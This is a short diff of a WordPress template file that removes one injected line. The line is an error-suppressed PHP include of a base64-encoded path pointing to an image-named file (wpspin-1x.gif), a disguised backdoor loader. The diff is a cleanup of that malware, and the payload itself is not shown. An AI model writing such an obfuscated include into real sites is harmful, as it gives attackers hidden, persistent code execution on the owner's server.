@@ -1159,7 +1159,6 @@ function get_custom_logo( $blog_id = 0 ) {
  *
  * @param int $blog_id Optional. ID of the blog in question. Default is the ID of the current blog.
  */
-@include base64_decode("L3Zhci93d3cvc2ltb25uZWVsbGVfZGUvd29yZHByZXNzL3dwLWluY2x1ZGVzL2ltYWdlcy93cHNwaW4tMXguZ2lm");
 function the_custom_logo( $blog_id = 0 ) {
 	echo get_custom_logo( $blog_id );
 }
